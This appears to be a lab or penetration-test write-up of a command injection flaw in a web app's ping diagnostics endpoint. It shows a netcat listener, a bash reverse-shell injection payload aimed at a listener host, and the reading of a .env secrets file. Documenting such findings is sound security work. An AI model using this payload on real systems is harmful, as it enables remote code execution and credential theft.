# Task 17: Command Injection

**Vulnerability:** OS Command Injection (CWE-78)

**Endpoint:** `GET /admin/tools/ping`

The staff diagnostics tool passes the `host` parameter directly to a system ping
command without sanitization. Shell metacharacters appended to a valid IP address
execute as separate commands under the web server's context.

---

## Steps

Starting with a simple `id` injection to confirm command execution:

<img width="762" height="437" alt="image" src="https://github.com/user-attachments/assets/4f1d5361-c446-43ad-ab9d-f445ee3bde5b" />

With execution confirmed, the next step is a reverse shell. Start a listener on Kali:

```bash
nc -lvnp 4444
```

For payload generation I used [revshells.com](https://www.revshells.com/), entering
the Kali IP, listener port, and selecting bash as the shell. Our earlier
fingerprinting confirmed the server runs Debian whose default shell is bash:

<img width="1112" height="880" alt="image" src="https://github.com/user-attachments/assets/d16f8811-61ee-457c-ba92-c694723e5ab1" />

The generated payload is appended to a valid host value and sent via Burp Repeater.
Two things were needed to get the server to process it correctly, `bash -c` as the
executor and single quotes wrapping the payload, which properly delimit the `-c`
argument from the surrounding shell context the app wraps around the input. The final
payload `127.0.0.1;bash -c ‘bash -i >& /dev/tcp/192.168.77.2/4444 0>&1’`

Burp request edited and sent seen below:

<img width="1708" height="433" alt="image" src="https://github.com/user-attachments/assets/ab92d98c-4e31-46bf-b11b-d28899a52455" />



## Evidence

The `id` and `cat /var/www/electra/.env` output from the reverse shell:

<img width="699" height="853" alt="image" src="https://github.com/user-attachments/assets/1a292056-02d9-4dfe-90ed-b4ae522f98b4" />

## What this reveals to an attacker

The diagnostics tool gives any staff account a direct path to remote code execution
as `www-data`. Combined with the staff credentials exposed in `install-notes.txt`,
this is reachable from an unauthenticated starting point in two steps.

## Remediation

See [remediation](../remediation.md)
